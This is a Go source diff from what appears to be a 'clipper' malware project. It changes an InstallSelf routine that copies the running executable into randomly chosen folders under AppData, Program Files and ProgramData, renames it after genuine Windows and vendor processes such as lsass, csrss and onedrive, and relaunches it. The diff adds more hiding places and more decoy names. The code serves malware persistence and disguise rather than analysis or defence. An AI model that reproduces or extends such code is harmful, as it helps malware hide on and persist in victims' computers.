@@ -11,47 +11,100 @@ import (
 	"clipper/src/utils"
 )
 
+
 func InstallSelf() {
 	exePath, err := utils.GetSelfPath()
 	if err != nil {
 		return
 	}
 	
+	var possiblePaths []string
+	
+	// %appdata%
 	appdata := os.Getenv("APPDATA")
-	if appdata == "" {
-		return
-	}
-	
-	exeDir := filepath.Dir(exePath)
-	if strings.HasPrefix(filepath.Clean(exeDir), filepath.Clean(appdata)) {
-		return
-	}
-	
-	entries, _ := os.ReadDir(appdata)
-	var dirs []string
-	for _, entry := range entries {
-		if entry.IsDir() {
-			dirs = append(dirs, filepath.Join(appdata, entry.Name()))
+	if appdata != "" {
+		entries, _ := os.ReadDir(appdata)
+		for _, entry := range entries {
+			if entry.IsDir() {
+				possiblePaths = append(possiblePaths, filepath.Join(appdata, entry.Name()))
+			}
 		}
 	}
 	
-	if len(dirs) == 0 {
+	// %programfiles%
+	programFiles := os.Getenv("ProgramFiles")
+	if programFiles != "" {
+		possiblePaths = append(possiblePaths, programFiles)
+		
+		entries, _ := os.ReadDir(programFiles)
+		for _, entry := range entries {
+			if entry.IsDir() {
+				possiblePaths = append(possiblePaths, filepath.Join(programFiles, entry.Name()))
+			}
+		}
+	}
+	
+	programFilesX86 := os.Getenv("ProgramFiles(x86)")
+	if programFilesX86 != "" && programFilesX86 != programFiles {
+		possiblePaths = append(possiblePaths, programFilesX86)
+		
+		entries, _ := os.ReadDir(programFilesX86)
+		for _, entry := range entries {
+			if entry.IsDir() {
+				possiblePaths = append(possiblePaths, filepath.Join(programFilesX86, entry.Name()))
+			}
+		}
+	}
+
+	// %programdata%
+	programData := os.Getenv("ProgramData")
+	if programData != "" {
+		possiblePaths = append(possiblePaths, programData)
+		
+		entries, _ := os.ReadDir(programData)
+		for _, entry := range entries {
+			if entry.IsDir() {
+				possiblePaths = append(possiblePaths, filepath.Join(programData, entry.Name()))
+			}
+		}
+	}
+	
+	exeDir := filepath.Dir(exePath)
+	for _, path := range possiblePaths {
+		if strings.HasPrefix(filepath.Clean(exeDir), filepath.Clean(path)) {
+			return
+		}
+	}
+	
+
+	if len(possiblePaths) == 0 {
 		return
 	}
 	
-	names := []string{"msedgewebview2", "crss", "smss", "lsass", "csrss", "rundll32", "mmc", "spoolsv", "MsMpEng"}
+	names := []string{
+		"lsass", "csrss", "services",
+		"searchindexer", "searchprotocolhost", "conhost", "dllhost",
+		"wininit", "trustedinstaller", "msiexec", "wermgr", "werfault",
+		"audiosrv", "spooler", "bits", "wuauclt", "securityhealthservice",
+		"securityhealthsystray", "googleupdate", "microsoftedgeupdate",
+		"edgeupdate", "onedrive", "onedriveupdate", "adobeupdate", "acrotray",
+		"javaupdate", "systemservice", "systemhost", "servicehost", "hostservice",
+		"runtimehost", "updatehost", "windowshost", "systemruntime",
+	}
+
 	randomName := names[rand.Intn(len(names))]
-	installDir := dirs[rand.Intn(len(dirs))]
+
+	installDir := possiblePaths[rand.Intn(len(possiblePaths))]
 	installedExe := filepath.Join(installDir, randomName+".exe")
 	
-	// fmt.Printf("Installing to %s\n", installedExe)
-	
+	os.MkdirAll(installDir, 0755)
+
 	in, _ := os.Open(exePath)
 	out, _ := os.Create(installedExe)
 	io.Copy(out, in)
 	in.Close()
 	out.Close()
-	
+
 	cmd := exec.Command(installedExe, os.Args[1:]...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
